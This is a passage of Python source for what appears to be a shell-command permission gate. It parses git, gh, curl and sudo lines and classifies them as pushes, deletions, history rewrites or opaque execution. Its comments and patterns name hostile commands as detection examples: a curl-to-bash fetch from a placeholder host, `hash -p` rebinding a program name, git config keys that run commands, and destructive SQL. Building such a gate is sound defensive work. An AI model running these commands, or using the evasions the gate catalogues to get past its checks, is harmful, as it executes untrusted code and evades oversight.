project cache ruleset org config attestation completion discussion help version --version --help
""".split())
_DATA_FLAGS = ("-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "-F", "--form",
               "--json", "-T", "--upload-file", "--form-string", "--data-ascii", "--expand-data")
# #208: where a post's text comes from somewhere the line does not show. gh builds the body itself (--fill, a
# template, the editor, generated notes); the HTTP clients read a file, stdin or a config file.
_GH_UNSEEN_FLAGS = {
    ("pr", "create"): ("-f", "--fill", "--fill-first", "--fill-verbose", "-e", "--editor", "-T", "--template",
                       "--recover", "--attach"),
    ("issue", "create"): ("-e", "--editor", "-T", "--template", "--recover", "--attach"),
    ("pr", "comment"): ("-e", "--editor", "--attach"), ("issue", "comment"): ("-e", "--editor", "--attach"),
    ("pr", "edit"): ("--attach",), ("issue", "edit"): ("--attach",),
    ("release", "create"): ("--generate-notes", "--notes-from-tag"), ("release", "edit"): ("--generate-notes",),
}
# gh's options that take a value, per command (gh 2.102 `--help`; `-R`/`--repo` is inherited), so the gate reads
# a line as gh does: in `gh issue create -t -b -b x` the title is `-b` and the body `x` (#208).
_GH_TAKES = {
    ("pr", "create"): ("aBbFHlmprTtR", "--assignee --attach --base --head --label --milestone --project --recover "
                                       "--reviewer --template --repo"),
    ("pr", "comment"): ("bFR", "--attach --repo"), ("pr", "review"): ("bFR", "--repo"),
    ("pr", "close"): ("cR", "--comment --repo"), ("pr", "reopen"): ("cR", "--comment --repo"),
    ("pr", "merge"): ("AbFtR", "--author-email --body --body-file --match-head-commit --subject --repo"),
    ("pr", "edit"): ("BbFmtR", "--add-assignee --add-label --add-project --add-reviewer --attach --base --milestone "
                               "--remove-assignee --remove-label --remove-project --remove-reviewer --repo"),
    ("issue", "create"): ("abFlmpTtR", "--assignee --attach --blocked-by --blocking --label --milestone --parent "
                                       "--project --recover --template --type --repo"),
    ("issue", "comment"): ("bFR", "--attach --repo"),
    ("issue", "close"): ("crR", "--comment --duplicate-of --reason --repo"),
    ("issue", "reopen"): ("cR", "--comment --repo"),
    ("issue", "edit"): ("bFmtR", "--add-assignee --add-blocked-by --add-blocking --add-label --add-project "
                                 "--add-sub-issue --attach --milestone --parent --remove-assignee --remove-blocked-by "
                                 "--remove-blocking --remove-label --remove-project --remove-sub-issue --type --repo"),
    ("release", "create"): ("nFtR", "--discussion-category --notes-start-tag --target --repo"),
    ("release", "edit"): ("nFtR", "--discussion-category --tag --target --repo"),
    # #399, from gh 2.89 `--help`: so the operands of everyday lines read as gh reads them.
    ("pr", "ready"): ("R", "--repo"),
    ("pr", "lock"): ("rR", "--reason --repo"), ("pr", "unlock"): ("R", "--repo"),
    ("issue", "develop"): ("bnR", "--base --branch-repo --name --repo"),
    ("issue", "lock"): ("rR", "--reason --repo"), ("issue", "unlock"): ("R", "--repo"),
    ("issue", "delete"): ("R", "--repo"), ("issue", "transfer"): ("R", "--repo"),
    ("release", "upload"): ("R", "--repo"), ("release", "delete"): ("R", "--repo"),
}
# The rows #399 added or changed, as they were before it. A post the unseen check found unseen with the old row
# stays unseen (_gh_unseen), so no line decides lower than it did. pr reopen, pr merge and issue reopen are not
# here: #399 takes their rows as #397 wrote them.
_GH_TAKES_BEFORE_399 = {("issue", "close"): ("cR", "--comment --reason --repo"),
                        **{k: ("", "") for k in (("pr", "ready"), ("pr", "lock"), ("pr", "unlock"),
                                                 ("issue", "develop"), ("issue", "lock"), ("issue", "unlock"),
                                                 ("issue", "delete"), ("issue", "transfer"), ("release", "upload"),
                                                 ("release", "delete"))}}
_GH_API_FIELDS = ("-f", "--raw-field", "-F", "--field")
_GH_API_TAKES = "FHqXpft"      # gh api's short options that take a value
# and its long ones (gh 2.89 `gh api --help`): a header, a jq query or a template can hold a path (#399).
_GH_API_LONGS = ("--cache", "--field", "--header", "--hostname", "--input", "--jq", "--method", "--preview",
                 "--raw-field", "--template")
# Option values that are not the request body, so a variable there (a token in a header) leaves it readable.
_HTTP_META = {"curl": ("-H", "--header", "-u", "--user", "-A", "--user-agent", "--oauth2-bearer"),
              "wget": ("--header", "--user", "--password", "--http-user", "--http-password"),
              "http": ("-a", "--auth"), "https": ("-a", "--auth"), "xh": ("-a", "--auth"), "httpie": ("-a", "--auth")}
_SQL_DESTRUCTIVE = re.compile(r"\b(drop\s+(table|database|schema|trigger|view|index)|truncate\s+|delete\s+from)\b",
                              re.I)
_URL = re.compile(r"https?://[^\s'\"<>]+")
_GH_URL = re.compile(r"https?://github\.com/([\w.-]+/[\w.-]+)(?:/(?:pull|issues|discussions)/(\d+))?")


def _opt(argv: list[str], *names: str) -> str | None:
    """Value of the first matching option: `--body x`, `--body=x`, `-b x`, `-bx` (short only)."""
    for i, a in enumerate(argv):
        for n in names:
            if a == n and i + 1 < len(argv):
                return argv[i + 1]
            if n.startswith("--") and a.startswith(n + "="):
                return a[len(n) + 1:]
            if len(n) == 2 and not n.startswith("--") and a.startswith(n) and len(a) > 2 and not a.startswith("--"):
                return a[2:]
    return None


def _opts(argv: list[str], *names: str) -> list[str]:
    out = []
    for i, a in enumerate(argv):
        for n in names:
            if a == n and i + 1 < len(argv):
                out.append(argv[i + 1])
            elif n.startswith("--") and a.startswith(n + "="):
                out.append(a[len(n) + 1:])
    return out


def _has(argv: list[str], *flags: str) -> bool:
    for a in argv:
        if a in flags:
            return True
        # combined short flags like -rf
        if re.fullmatch(r"-[A-Za-z]{2,}", a):
            if any(len(f) == 2 and f[0] == "-" and f[1] in a[1:] for f in flags):
                return True
    return False


def _hash_rebind(words: list) -> tuple[str, str] | None:
    """What a `hash` call rebinds, as (card text, target), or None when it binds nothing (#330). `hash -p PATH NAME`
    makes the shell run PATH for every later NAME, so a file planted by an earlier write runs under a trusted
    program's name. Options are read as bash reads them: up to the first operand or `--`, `-p` in a cluster (`-rp`,
    `-dp`) or with its path attached (`-p/tmp/x`), and more options after the path (the last `-p` wins). Nothing is
    bound with no path, an empty one, or no name but those with a slash, which bash skips. A word the gate cannot
    read (an expansion, a brace set, a glob, also one that starts with a `[` the lexer does not mark) may hold more.
    Before a `-p` it may be one, unless it is a lone double-quoted word at the end (`hash "$cmd"`), and so may `~-`,
    `~+` or `~1`, which bash reads from OLDPWD, PWD or the directory stack (`OLDPWD=-p`). From the path on,
    it may split into a path and a name (`hash -p $P` with P='/x ls'), unless it is one double-quoted word, and as a
    name it may lose its slash (`hash -p /x {ls,/}` binds ls). A glob keeps a slash it has. A double-quoted word
    with `$@` or `${!` is never one word: `"${!n}"` with n=@ splits as `"$@"` does."""
    def glob(w: _Word) -> bool:     # an unquoted `[` that starts a word, also after a `\<newline>`, as for unset
        return w.glob or w.raw.replace("\\\n", "")[:1] == "["

    def tilde(w: _Word) -> bool:    # `~-`, `~+`, `~1`: OLDPWD, PWD or the directory stack, which a line may set
        return bool(re.match(r"~(?:[+-]\d*|\d+)(?:/|$)", w.raw.replace("\\\n", "")))

    def lone(w: _Word) -> bool:     # one double-quoted word stays one word, but "${!n}" with n=@ splits as "$@"
        return bool(re.fullmatch(r'"[^"@]*"', w.raw)) and "${!" not in w.raw.replace("\\\n", "")

    args, path, at, i = words[1:], None, 0, 0
    while i < len(args):
        w, a = args[i], args[i].text
        if path is None and (w.dynamic or glob(w) or w.brace or tilde(w)) and not (i + 1 == len(args) and lone(w)):
            return f"hash may rebind a program name: an option word the gate cannot read ({a[:40]})", a
        if a == "--":
            i += 1
            break
        if len(a) < 2 or not a.startswith("-"):
            break
        j = a.find("p")
        if j > 0 and j + 1 == len(a):      # -p with its path in the next word
            if i + 1 == len(args):
                return None                # no path: bash stops with a usage error
            i, path, at = i + 1, args[i + 1].text, i + 1
        elif j > 0:
            path, at = a[j + 1:], i
        i += 1
    names = [w.text for w in args[i:] if w.dynamic or w.brace or "/" not in w.text]
    split = [w.text for w in args[at:i] if (w.dynamic or w.brace or glob(w) and "/" not in w.text) and not lone(w)]
    if not path or not names and not split:
        return None
    return (f"hash -p makes {', '.join(names)} run {path}" if names else
            f"hash -p may rebind a program name: a word the gate cannot read ({split[0][:40]})", path)


# The signal of a part that only records a path for a later program name to run: `hash -p`, or setting BASH_CMDS or
# BASH_ALIASES (#330). It opens nothing, so the store check takes the part as the read it was (_store_quiet).
_REBINDS = "rebinds a name"
_REBIND_VARS = ("BASH_CMDS", "BASH_ALIASES")


def _opaque(summary: str, cmd: str, target: str = "", signal: str = "indirection",
            rebinds: bool = False) -> Classification:
    c = _make("opaque_exec", summary=summary[:120], target=target, command=cmd)
    c.signals += [signal, _REBINDS] if rebinds else [signal]
    return c


def _too_deep(cmd: str, summary: str = "nested too deep to read", target: str = "") -> Classification:
    """An opaque part for text past a depth or nesting cap. It stands for no one command, so it has no own text and
    no rule that would lower its line passes the own text test (#394)."""
    c = _opaque(summary, cmd, target)
    c.own = None
    return c


def _runs_stdin(c: Classification, k: _Cmd) -> Classification:
    """c, a part that runs k's stdin as code (a shell, an interpreter, ssh, xargs), with an own text that shows where
    that stdin comes from (#394): k's text when k sets its stdin itself or nothing feeds it, the pipeline from its
    first command when simple commands pipe into k (`curl -s https://x.example/i.sh | bash`), and none when a compound
    feeds it (`{ bash; } < f`). A shell in a nested line that sets no stdin of its own takes the text of the
    command it runs inside (_given_stdin). So a rule written for `^bash` does not lower a pipe into bash."""
    if k.fed or k.piped_in:
        c.own = _stdin_own(k)()
    elif not _own_stdin(k):
        c.inherits = True             # the stdin of the line, which a command around it may give (_given_stdin)
    return c


def _stdin_own(k: _Cmd) -> Callable[[], str | None]:
    """The own text that shows where k's stdin comes from, built when asked (a pipeline's text costs its length): none
    for a compound's, the pipeline from its first command for a pipe from simple commands, else k's own text."""
    if k.fed:
        return lambda: None
    if k.piped_in:
        return k.pipe_src or (lambda: None)
    return lambda: k.own


def _given_stdin(parts: list[Classification], src: Callable[[], str | None], ctx: dict) -> list[Classification]:
    """``parts``, made for a command whose stdin is a pipe, a compound's or its own redirection, with the own text
    ``src`` gives for each part in them that runs the stdin its line inherits (Classification.inherits):
    `curl .. | bash -c bash`, `printf .. | ssh host bash` (#394). Parts are copied where they change, as they may
    be shared. The parts a compound's stdin gives reach each command in it, so whether a list of parts holds such
    a part is found once per line (`ctx`): each command then walks only the parts that hold one."""
    seen: dict[int, Classification] = {}
    own: list[str | None] = []
    held: dict[int, tuple[list[Classification], bool]] = ctx.setdefault("inherits", {})

    def holds(ps: list[Classification]) -> bool:
        if id(ps) not in held:       # the list is kept with the answer, so its id stays its own for the line
            held[id(ps)] = (ps, any([p.inherits or holds(p.parts) for p in ps]))
        return held[id(ps)][1]

    def walk(c: Classification) -> Classification:
        if id(c) not in seen:
            seen[id(c)] = c          # a part met again through a shared one is left as it is
            if not (c.inherits or holds(c.parts)):
                return c
            kids = [walk(p) for p in c.parts]
            if c.inherits and not own:
                own.append(src())
            if c.inherits or any(a is not b for a, b in zip(kids, c.parts)):
                seen[id(c)] = replace(c, parts=kids, own=own[0] if c.inherits else c.own, inherits=False)
        return seen[id(c)]
    return [walk(p) for p in parts]


def _run_privileged(c: Classification) -> None:
    """Count c, a part a privileged wrapper (sudo, doas, chroot...) runs, as costly where it is reversible, as main
    does, and add to its parts a costly copy of each reversible part it was built from, nested ones included: what
    the wrapper runs over ssh or through a shell runs as privileged as the rest (`sudo ssh host 'cat ${x}rc'`), so a
    rule on costly parts still matches the command inside when the line reads as a secret or a store write. The
    parts themselves stay as they are, so a rule or entry on reversible parts still matches them. A copy holds no
    parts (each nested part gets its own) and no post (the posting checks read the original's once). None is made
    where a costly part a rule cannot tell from it is already there (a wrapper inside a wrapper): linear in the
    parts."""
    _raise_axes(c, reversibility="costly")          # with the part a sudo write copy displaced (#454)

    def key(p: Classification) -> tuple:
        return p.category, p.tool, p.target, p.exposure, p.third_party, p.command, p.own, tuple(p._command_views)
    parts, copies = list(_each_part(c))[1:], []
    have = {key(p) for p in parts if p.reversibility == "costly"}
    for p in parts:
        if p.reversibility == "reversible" and key(p) not in have:
            have.add(key(p))
            copies.append(replace(p, reversibility="costly", parts=[], text="", title="", text_file="", own_signals=[
                s for s in (p.signals if p.own_signals is None else p.own_signals) if s != "unseen_body"]))
    c.parts = c.parts + copies


def _git_config_kind(key: str, value: str) -> str:
    """What a git config pair makes git do: "exec" for an exec key (an alias, the pager, the editor,
    core.sshCommand, a hook path, a filter, any key whose last part ends in `command` or `cmd`...) or a
    `!shell` value, "load" for a key that loads another config file or a template, "ext" for one that lets
    git run an `ext::` URL, "" otherwise. One check for `git -c`, `git config`, `git clone --config` and the
    GIT_CONFIG_* variables."""
    if _GIT_EXEC_KEY.match(key) or value.startswith("!"):
        return "exec"
    if _GIT_LOAD_KEY.match(key):
        return "load"
    m = _GIT_EXT_URL_KEY.match(key)
    ext = _GIT_EXT_ALLOW.match(key) or m and (m.group(1).lower().startswith("url.") or
                                              value.lower().startswith("ext::"))
    return "ext" if ext else ""


_GIT_CONFIG_DOES = {"exec": "runs a configured command", "load": "loads a config file or template the gate does not read",
                    "ext": "lets git run the command in an ext:: URL"}
# `git config` (old and new forms): the subcommands, and git's long options (git 2.54 `git config -h` and each
# subcommand's), those that take a value marked with `=`. git takes any unique prefix of a long option
# (`--fil`, `--ty`, `--rename-sec`) and `--no-` before the ones that take a value; `-f` and `-t` take one too.
_GIT_CONFIG_SUBS = frozenset("list get set unset rename-section remove-section edit".split())
_GIT_CONFIG_LONGS = tuple("""all append blob= comment= default= fixed-value global includes local name-only regexp
    show-names show-origin show-scope system url= value= worktree add bool bool-or-int bool-or-str expiry-date get
    get-all get-color get-colorbool get-regexp get-urlmatch int path remove-section rename-section replace-all unset
    unset-all edit file= list type= null""".split())


def _git_config_long(word: str) -> tuple[str, bool]:
    """A `--option[=value]` word as git config reads it: (the option's full name, "" when git rejects it as
    unknown or ambiguous, and whether it takes the next word as its value)."""
    body, eq, _ = word[2:].partition("=")
    for neg in ("", "no-"):
        if neg and not body.startswith(neg):
            continue
        part = body[len(neg):]
        names = [o for o in _GIT_CONFIG_LONGS if o.rstrip("=") == part] or \
            [o for o in _GIT_CONFIG_LONGS if o.startswith(part) and not (neg and not o.endswith("="))]
        if len(names) == 1:
            name = names[0]
            return neg + name.rstrip("="), name.endswith("=") and not neg and not eq
    return "", False


def _git_config_args(rest: list[str]) -> tuple[str, list[str]]:
    """`git config`'s words after `config` as git reads them: (the subcommand, or the old form's mode option
    without its dashes, "" for none; the names and values left). The values of `-f`, `-t`, `--file`, `--type`,
    `--default` and the like, also abbreviated, are skipped, so neither they nor `set` is read as the key."""
    mode, pos, i = "", [], 0
    while i < len(rest):
        a, i = rest[i], i + 1
        if a == "--":
            pos += rest[i:]
            break
        if a.startswith("--"):
            name, takes = _git_config_long(a)
            i += takes
            if name in ("add", "replace-all", "get", "get-all", "get-regexp", "get-urlmatch", "unset", "unset-all",
                        "rename-section", "remove-section", "list", "edit", "get-color", "get-colorbool"):
                mode = mode or name
        elif a.startswith("-") and len(a) > 1:          # -f FILE, -tTYPE, -l, -e, -z, clustered
            for n, ch in enumerate(a[1:], 2):
                if ch in "ft":                          # takes the rest of the word, or the next word
                    i += 0 if a[n:] else 1
                    break
                mode = mode or {"l": "list", "e": "edit"}.get(ch, "")
        elif not mode and not pos and a in _GIT_CONFIG_SUBS:
            mode = a
        else:
            pos.append(a)
    return mode, pos


def _git_config_sets(rest: list[str]) -> list[str]:
    """The KEY=VALUE pairs `git config ...` writes (`set`, `--add`, `--replace-all`, or a name and a value)."""
    mode, pos = _git_config_args(rest)
    return [f"{pos[0]}={pos[1]}"] if mode in ("", "set", "add", "replace-all") and len(pos) > 1 else []


def _git_config_env(spec: str) -> str:
    """`--config-env=KEY=ENVVAR` as the `-c KEY=VALUE` it is: the value comes from a variable the gate
    does not see. git splits at the last `=`."""
    key, _, var = spec.rpartition("=")
    return f"{key}=${{{var}}}"


def _git_subcommand(argv: list[str], config: list[str] | None = None) -> int:
    """Index of the git subcommand after the global options; `-c`/`--config-env` values go to `config`."""
    i = 1
    while i < len(argv) and argv[i].startswith("-"):
        if argv[i].startswith("--config-env="):
            if config is not None:
                config.append(_git_config_env(argv[i].split("=", 1)[1]))
            i += 1
            continue
        if argv[i] in ("-C", "-c", "--git-dir", "--work-tree", "--namespace", "--super-prefix", "--config-env"):
            if argv[i] in ("-c", "--config-env") and i + 1 < len(argv) and config is not None:
                config.append(argv[i + 1] if argv[i] == "-c" else _git_config_env(argv[i + 1]))
            i += 2
            continue
        i += 1
    return i


def _classify_git(argv: list[str], cmd: str) -> Classification:
    """git's own category, from its subcommand. Config set on the line (`git -c`, `--config-env`) does not replace it
    (#335): _exec_options adds a part for each such pair, so the line asks and a deny on push, force_push or delete
    still fires. Only an unknown subcommand, which that config may define, is opaque here."""
    config: list[str] = []
    i = _git_subcommand(argv, config)
    sub, rest = (argv[i] if i < len(argv) else ""), argv[i + 1:]
    if sub and sub not in _GIT_SUBS:
        for kv in config:
            k, _, v = kv.partition("=")
            if kind := _git_config_kind(k, v):
                return _opaque(f"git -c {k} {_GIT_CONFIG_DOES[kind]}"[:120], cmd)
        return _opaque(f"git {sub} (an alias or extension the gate cannot see)", cmd)
    if sub == "config":
        mode, names = _git_config_args(rest)
        if mode == "rename-section" and len(names) > 1:   # moves every key of a section under a new name
            return _opaque(f"git config renames a section to {names[1]}, which can make its keys run a command"[:120],
                           cmd)
        for kv in _git_config_sets(rest) or ([f"{names[0]}="] if names and mode in ("add", "replace-all") else []):
            k, _, v = kv.partition("=")
            if kind := _git_config_kind(k, v):        # the write stays a part, so a deny on local_write fires
                return _combine([_opaque(f"git config sets {k}, which {_GIT_CONFIG_DOES[kind]}"[:120], cmd),
                                 _make("local_write", summary="git config", command=cmd)], cmd)
    if sub == "push":
        remote = next((a for a in rest if not a.startswith("-")), "")
        if _has(rest, "-f", "--force", "--force-with-lease", "--force-if-includes", "--mirror") or \
                any(a.startswith(("+", "--force-with-lease=")) for a in rest):
            return _make("force_push", summary=f"force-push to {remote or 'remote'}", target=remote, command=cmd)
        if _has(rest, "-d", "--delete") or any(a.startswith(":") and len(a) > 1 for a in rest):
            return _make("delete", exposure="internal", summary=f"delete remote branch on {remote or 'remote'}",
                         target=remote, command=cmd)
        return _make("vcs_push", summary=f"git push to {remote or 'remote'}", target=remote, command=cmd)
    if sub == "reset" and "--hard" in rest:
        return _make("history_rewrite", summary="git reset --hard", command=cmd)
    if sub == "branch" and _has(rest, "-D") or (sub == "branch" and "--delete" in rest and "--force" in rest):
        return _make("history_rewrite", summary="force-delete a local branch", command=cmd)
    if sub == "clean" and _has(rest, "-f", "--force"):
        return _make("delete", summary="git clean -f", command=cmd)
    if sub in ("checkout", "restore") and ("." in rest or "--" in rest) and not _has(rest, "-b", "-B", "--staged"):
        return _make("history_rewrite", summary=f"git {sub} discards local changes", command=cmd)
    if sub == "stash" and rest[:1] and rest[0] in ("drop", "clear"):
        return _make("history_rewrite", summary=f"git stash {rest[0]}", command=cmd)
    if sub == "tag" and _has(rest, "-d"):
        return _make("history_rewrite", summary="delete a tag", command=cmd)
    if sub in ("status", "log", "diff", "show", "fetch", "branch", "remote", "rev-parse", "blame", "ls-files",
               "grep", "describe", "shortlog", "reflog", "rev-list", "cat-file", "ls-remote", "ls-tree", "version",
               "help", "merge-base", "name-rev", "check-ignore", "count-objects"):
        return _make("read", summary=f"git {sub}", command=cmd)
    return _make("local_write", summary=f"git {sub}".strip(), command=cmd)


def _gh_on_github(host: str) -> bool:
    """Whether gh sends its requests for a repo on ``host`` to github.com (round 6 of #399). ``host`` is as gh keeps
    it, in lower case and without a leading `www.` (ghrepo.NewWithHost in gh 2.89). go-gh 2.13's NormalizeHostname
    reads github.com and any host that ends in `.github.com` as github.com, and its GraphQL and REST clients send
    the request there with the github.com token (`api.github.com`, `gist.github.com`). garage.github.com is the one
    such host they call at itself. Any other host is another instance (`ghe.corp`, `x.ghe.com`, `github.com.`)."""
    return host != "garage.github.com" and (host == "github.com" or host.endswith(".github.com"))


def _gh_host(host: str) -> str:
    """A repo's host as gh keeps it (ghrepo.NewWithHost in gh 2.89): without a leading `www.`, then in lower case as
    Go's strings.ToLower gives it, one character for one (round 7 of #399). Python lowers U+0130 to `i` and a
    combining dot, Go to `i` alone, so for gh `gİthub.com` is github.com. No other character differs."""
    return "".join("i" if c == "\u0130" else c.lower() for c in host.removeprefix("www."))


def _gh_url_host(authority: str) -> str | None:
    """The host gh takes from a URL's authority (round 7 of #399), as Go 1.26's url.Parse and u.Hostname() give it:
    after the last `@` and without the port, then percent-decoded, then as gh keeps it (_gh_host). url.Parse takes
    the port after the first `:`, or after the `]` of an IPv6 address in brackets, and checks only that it is digits,
    so `github.com:99999` is github.com. It refuses another port, a `[` elsewhere, a `%` not before two hex digits,
    and an escape below %80 other than %25 (None then)."""
    hostport = authority.rpartition("@")[2]
    if hostport.startswith("["):
        name, bracket, port = hostport[1:].rpartition("]")
        if not bracket or "[" in name or not re.fullmatch(r"(?::[0-9]*)?", port):
            return None
    else:
        name, colon, port = hostport.partition(":")
        if "[" in hostport or (colon and not re.fullmatch(r"[0-9]*", port)):
            return None
    if re.search(r"%(?!25|[89a-fA-F][0-9a-fA-F])", name):
        return None
    return _gh_host(unquote(name, errors="replace"))


_GH_URL_PARTS = re.compile(r"(?i)https?://([^/?#]*)([^?#]*)")


def _gh_url_parts(word: str) -> tuple[str, str, str, str] | None:
    """(host, owner/name, kind, number) of a URL gh may read for a repo (#399): http or https in any case, the
    authority up to the path, a query or a fragment, its host read by _gh_url_host, and the path decoded, as Go's
    url.Parse reads them for gh 2.89. url.Parse refuses a control character before the first `#` only: it cuts the
    fragment off first and keeps one with a control character in it (round 9). A pull request, issue or discussion
    URL has its kind (`pull`, `issues`, `discussions`) and number, a repo URL neither. None for any other word."""
    m = _GH_URL_PARTS.match(word)
    if not m or re.search(r"[\x00-\x1f\x7f]", word.partition("#")[0]):
        return None
    host = _gh_url_host(m.group(1))
    path = re.match(r"/([\w.-]+/[\w.-]+)(?:/(pull|issues|discussions)/([0-9]+))?", unquote(m.group(2)))
    return (host, path.group(1), path.group(2) or "", path.group(3) or "") if path and host else None


def _gh_url(word: str, repo_word: bool = False) -> tuple[str, str] | None:
    """(owner/name, number) of a GitHub URL (#399): one on a host gh sends to github.com (_gh_on_github), read by
    _gh_url_parts. gh's own readers take a pull request URL (`ParseURL`) or an issue or pull request URL (the issue
    lookup). This takes a discussion URL and a repo URL too, which has no number: a reading more, since `-R` and the
    reading before #399 stay other targets. None for a word that is no such URL or names another instance.

    With ``repo_word`` the word is one gh reads as a repo with ghrepo.FromFullName (`-R`, gh repo's first word),
    whose host drops a leading `www.` twice, as _gh_repo_parts reads it (round 8). So
    `https://WWW.garage.github.com/pub/x` there is on garage.github.com, another instance, where a pull request
    URL's host keeps one `www.`, as does a URL that gh repo fork and clone read with ghrepo.FromURL (_gh_from_url)."""
    parts = _gh_url_parts(word)
    return (parts[1], parts[3]) if parts and _gh_on_github(_gh_host(parts[0]) if repo_word else parts[0]) else None


def _gh_from_url(verb: str, word: str) -> bool:
    """Whether gh repo ``verb`` reads its first word with ghrepo.FromURL, after cli's git.ParseURL, and not with
    ghrepo.FromFullName (round 9 of #399). In gh 2.89 gh repo fork reads an `http:/`, `https:/` or `git@` value so
    (fork.go), and gh repo clone any value with a `:` (clone.go). FromURL drops a leading `www.` once, so
    `https://www.www.garage.github.com/pub/x` is on www.garage.github.com there, which gh sends to github.com."""
    return (verb == "fork" and word.startswith(("http:/", "https:/", "git@"))) or (verb == "clone" and ":" in word)


# The kinds of URL gh reads a repo from in each group: a pull request URL in gh pr (finder.go's ParseURL), an issue
# or pull request URL in gh issue (lookup.go), and a discussion URL in the gate's discussion group.
_GH_URL_KINDS = {"pr": ("pull",), "issue": ("issues", "pull"), "discussion": ("discussions",)}


def _gh_elsewhere(group: str, verb: str, words: list[str]) -> list[tuple[str, str]]:
    """The (target, link) readings of the operands that name a repo on another instance (round 6 of #399), where gh
    reads a repo from an operand (round 7): a URL of its group's kind (_GH_URL_KINDS) on a host gh does not send to
    github.com (`https://ghe.corp/pub/repo/pull/9` is `ghe.corp/pub/repo#9`), and the first word of gh repo and of
    gh label clone, its source, in any form gh reads there (`ghe.corp/pub/repo`, _gh_repo_parts). gh acts there, and
    a scope names repos on github.com, so each is a target the scopes may not mean, as a `-R` on another instance is.
    Another URL, such as an option's value in a reading where every option is a flag, names no target here."""
    out = []
    for n, a in enumerate(words):
        url = _gh_url_parts(a)
        if url and url[3] and url[2] in _GH_URL_KINDS.get(group, ()) and not _gh_on_github(url[0]):
            out.append((f"{url[0]}/{url[1]}#{url[3]}", redact_userinfo(a)))
        elif n == 0 and (group == "repo" or (group, verb) == ("label", "clone")):
            repo = _gh_repo_parts(a, verb if group == "repo" else "")
            if repo and not _gh_on_github(repo[0]):
                out.append((f"{repo[0]}/{repo[1]}", redact_userinfo(a) if url else ""))
    return out


def _gh_read(group: str, repo: str, words: list[str], url: bool = True, before: bool = False,
             verb: str = "") -> tuple[str, str]:
    """(target, link) from a `-R` value and the words that may name the target: the first GitHub URL (_gh_url), whose
    repo replaces the `-R` value when ``url`` (gh does that), else the first number, and for `gh repo` an
    `owner/name` first word, also `github.com/owner/name` or a repo URL (_gh_repo). gh repo drops a repo URL's
    `.git`, and its first word's host is read as gh repo ``verb`` reads a repo's (_gh_url with ``repo_word``, unless
    _gh_from_url). gh gist reads no repo from a URL: it takes the gist's id from it. With ``before`` the words read
    as before #399: a URL only as _GH_URL matches it, as written, and gh repo's first word as written."""
    number = link = ""
    for n, a in enumerate(words):
        if before:
            m = _GH_URL.match(a)
            found = (m.group(1), m.group(2) or "") if m else None
        elif group == "gist":
            found = None                    # gh gist takes a gist's URL or id, never a repo (GistIDFromURL)
        else:
            found = _gh_url(a, repo_word=group == "repo" and n == 0 and not _gh_from_url(verb, a))
        if found:
            number = found[1]
            if url:
                named = found[0]
                if group == "repo" and not before and not number and named.endswith(".git"):
                    named = named[:-4]
                repo, link = named, redact_userinfo(a)
            break
        if re.fullmatch(r"#?\d+", a) and not number:
            number = a.lstrip("#")
    if not repo and group == "repo" and words:
        named, sure = (words[0], True) if before else _gh_repo(words[0], verb)
        if sure and re.fullmatch(r"[\w.-]+/[\w.-]+", named):
            repo = named
    if not link and repo:
        link = f"https://github.com/{repo}" + (f"/issues/{number}" if number else "")
    return (f"{repo}#{number}" if repo and number else repo or (f"#{number}" if number else "")), link


def _gh_operands(argv: list[str], takes: str, longs: tuple) -> tuple[str, list[int]]:
    """gh's `-R` value (the last, which gh keeps, read as pflag reads it) and the indexes of its operands after the
    subcommand, when the options in ``takes`` and ``longs`` take a value."""
    ops: list[int] = []
    repos = _option_values(argv, ("-R", "--repo"), start=3, takes=takes, longs=longs, least=99, rest=ops, pflag=True)
    return (repos[-1] if repos else ""), ops


_GH_REPO_URL = re.compile(r"(?:ssh|git\+ssh|git|https?|git\+https)://([^/?#]*)([^?#]*)")
# The schemes cli's git.ParseURL reads as a URL (isPossibleProtocol in gh 2.89). It reads any other value with a `:`
# and no `\` as scp-like ssh.
_GH_GIT_SCHEMES = ("ssh:", "git+ssh:", "git:", "http:", "git+https:", "https:", "ftp:", "ftps:", "file:")
_GH_GIT_URL = re.compile(r"(?:ssh|git\+ssh|git|https?|git\+https|ftps?|file)://([^/?#]*)([^?#]*)")


def _gh_repo_parts(value: str, verb: str = "") -> tuple[str, str] | None:
    """(host, owner/name) of a repo as gh reads `-R` (ghrepo.FromFullName in gh 2.89): `owner/name`,
    `HOST/owner/name`, or a URL (`https://HOST/owner/name`, `git@HOST:owner/name.git`). go-gh's git.ParseURL makes
    `git@HOST:path` `ssh://git@HOST/path`, and Go's url.Parse reads the URL: its host as _gh_url_host reads it, and
    its path decoded, without a query or a fragment, then without `.git`. url.Parse refuses a control character
    before the first `#` only (round 9). The host is as gh keeps it (_gh_host). A URL's host gets _gh_host twice,
    since go-gh's RepoInfoFromURL drops a leading `www.` and lowers the host, and ghrepo.NewWithHost does it again
    (round 8): `https://WWW.garage.github.com/x/y` is on garage.github.com.

    ``verb`` is gh repo's subcommand when the value is its first word. gh repo fork and clone read some values with
    cli's git.ParseURL and ghrepo.FromURL instead (_gh_from_url): a host gets _gh_host once there, any value with a
    `:` and no scheme of _GH_GIT_SCHEMES is scp-like ssh, and gh repo clone keeps the path's first two parts
    (clone.go's simplifyURL). None for a value gh refuses (#399)."""
    once = _gh_from_url(verb, value)
    if once:
        scp = ":" in value and "\\" not in value and not value.startswith(_GH_GIT_SCHEMES)
        url, pattern = ("ssh://" + value.replace(":", "/", 1) if scp else value), _GH_GIT_URL
    else:
        url = "ssh://" + value.replace(":", "/", 1) if value.startswith("git@") and ":" in value else value
        pattern = _GH_REPO_URL
    m = pattern.match(url)
    if once and not m:
        return None
    if m:
        host = None if re.search(r"[\x00-\x1f\x7f]", url.partition("#")[0]) else _gh_url_host(m.group(1))
        host = _gh_host(host) if host and not once else host
        rest = unquote(m.group(2)).strip("/")
        if once and verb == "clone":
            rest = "/".join(rest.split("/", 2)[:2])
        rest = rest[:-4] if rest.endswith(".git") else rest
    elif value.count("/") == 2:
        host, _, rest = value.partition("/")
        host = _gh_host(host)
    else:
        host, rest = "github.com", value
    parts = rest.split("/")
    return (host, rest) if host and len(parts) == 2 and all(parts) else None


def _gh_repo(value: str, verb: str = "") -> tuple[str, bool]:
    """(owner/name, sure) of a repo as gh reads `-R`, or gh repo ``verb`` its first word (_gh_repo_parts). Sure when
    gh sends the request to github.com (_gh_on_github), as a scope means. A value gh refuses comes back as written,
    and not sure (#399)."""
    parts = _gh_repo_parts(value, verb)
    return (parts[1], _gh_on_github(parts[0])) if parts else (value, False)


_GH_ANY_SHORT = "".join(chr(n) for n in range(33, 127))   # every character a short option can be


def _gh_api_operands(argv: list[str]) -> list[int]:
